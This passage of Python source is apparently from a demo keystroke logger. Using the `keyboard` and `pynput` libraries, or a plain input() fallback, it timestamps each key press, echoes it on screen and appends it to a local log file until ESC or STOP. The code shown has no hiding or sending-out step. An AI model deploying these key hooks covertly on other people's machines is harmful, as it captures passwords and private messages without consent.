# ══════════════════════════════════════════════════════════════
#  LOGGING CORE
# ══════════════════════════════════════════════════════════════

def write_log(entry):
    """Append one entry to the log file."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entry + "\n")


def ts():
    """Current timestamp string."""
    return datetime.now().strftime("%H:%M:%S")


# ── Backend: `keyboard` library ───────────────────────────────
def start_logging_keyboard():
    """
    Uses the `keyboard` library.
    Records every key press with timestamp until ESC is pressed.
    """
    key_count = [0]

    def on_key(event):
        if event.event_type != "down":
            return
        name = event.name
        timestamp = ts()
        if len(name) == 1:
            entry = f"[{timestamp}] KEY     : {name}"
        else:
            entry = f"[{timestamp}] SPECIAL : {name.upper()}"
        key_count[0] += 1
        print(f"  {entry}")
        write_log(entry)

    hook = kb_module.on_press(on_key)
    print(f"\n  🟢  Logging started — press ESC to stop\n")
    kb_module.wait("esc")
    kb_module.unhook(hook)
    return key_count[0]


# ── Backend: `pynput` library ─────────────────────────────────
def start_logging_pynput():
    """
    Uses the `pynput` library.
    Records every key press with timestamp until ESC is pressed.
    """
    from pynput import keyboard as pk
    key_count = [0]
    stop_flag = [False]

    def on_press(key):
        timestamp = ts()
        try:
            entry = f"[{timestamp}] KEY     : {key.char}"
        except AttributeError:
            name = str(key).replace("Key.", "").upper()
            entry = f"[{timestamp}] SPECIAL : {name}"
            if name == "ESC":
                stop_flag[0] = True
                return False   # stop listener

        key_count[0] += 1
        print(f"  {entry}")
        write_log(entry)

    print(f"\n  🟢  Logging started — press ESC to stop\n")
    with pk.Listener(on_press=on_press) as listener:
        listener.join()
    return key_count[0]


# ── Fallback: input()-based demo logger ───────────────────────
def start_logging_fallback():
    """
    Works on ANY system with NO extra libraries.
    User types lines; each character is logged individually.
    Demonstrates the same logging/saving concept.
    Type 'STOP' on a line by itself to finish.
    """
    print("\n  ℹ️   No keyboard hook library found.")
    print("  Running in DEMO MODE — type text and press Enter.")
    print("  Each character is individually timestamped and logged.")
    print("  Type  STOP  and press Enter to finish.\n")
    print(f"  🟢  Logging started\n")

    key_count = 0
    while True:
        try:
            line = input("  > ")
        except (EOFError, KeyboardInterrupt):
            break

        if line.strip().upper() == "STOP":
            break

        # Log each character individually (simulates keystroke logging)
        for char in line:
            timestamp = ts()
            if char == " ":
                entry = f"[{timestamp}] KEY     : SPACE"
            else:
                entry = f"[{timestamp}] KEY     : {char}"
            key_count += 1
            print(f"  {entry}")
            write_log(entry)

        # Log the Enter key
        entry = f"[{ts()}] SPECIAL : ENTER"
        key_count += 1
        print(f"  {entry}")
        write_log(entry)

    return key_count


